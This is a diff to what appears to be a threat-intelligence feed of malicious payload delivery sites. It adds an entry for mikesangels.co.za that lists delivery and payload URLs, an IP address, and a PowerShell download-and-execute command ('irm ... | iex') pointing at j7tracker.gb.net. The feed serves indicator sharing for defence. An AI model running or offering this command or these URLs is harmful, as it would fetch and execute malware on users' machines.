@@ -1,5 +1,24 @@
 [
   {
+    "UrlDomain": "mikesangels.co.za",
+    "DeliveryUrl": [
+      "j7tracker.gb.net"
+    ],
+    "PayloadUrl": [
+      "https://j7tracker.gb.net/8pchkbdes5/0b5ea79d54741fd9"
+    ],
+    "IP": [
+      "154.0.174.24"
+    ],
+    "Related": [],
+    "Payload": "(irm 'https://j7tracker[.]gb[.]net/8pchkbdes5/0b5ea79d54741fd9')|iex",
+    "ResolvedDownloadUrl": [
+      "https://j7tracker.gb.net/8pchkbdes5/0b5ea79d54741fd9"
+    ],
+    "ReportId": "cmwnhlqw11wtv0omlgny6ppm6",
+    "ScannedAt": "2026-11-19T11:48:54.823000+00:00"
+  },
+  {
     "UrlDomain": "www.stridesj.co.uk",
     "DeliveryUrl": [
       "img-codes-cloude.info"
